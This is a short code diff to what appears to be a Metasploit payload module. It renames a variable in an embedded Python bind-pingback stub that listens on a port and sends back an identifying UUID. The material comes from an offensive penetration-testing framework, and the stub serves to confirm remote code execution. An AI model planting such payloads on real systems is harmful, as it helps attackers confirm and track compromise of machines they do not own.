@@ -33,14 +33,14 @@ module MetasploitModule
     self.pingback_uuid ||= self.generate_pingback_uuid
     cmd = <<~PYTHON
       import socket as s
-      so=s.socket(s.AF_INET,s.SOCK_STREAM)
+      o=s.socket(s.AF_INET,s.SOCK_STREAM)
       try:
-       so.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
-       so.bind(('0.0.0.0', #{ datastore['LPORT']}))
-       so.listen(1)
-       so,addr=so.accept()
-       so.send('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.decode('base64'))
-       so.close()
+       o.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
+       o.bind(('0.0.0.0', #{ datastore['LPORT']}))
+       o.listen(1)
+       o,addr=o.accept()
+       o.send('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.decode('base64'))
+       o.close()
       except:
        pass
     PYTHON
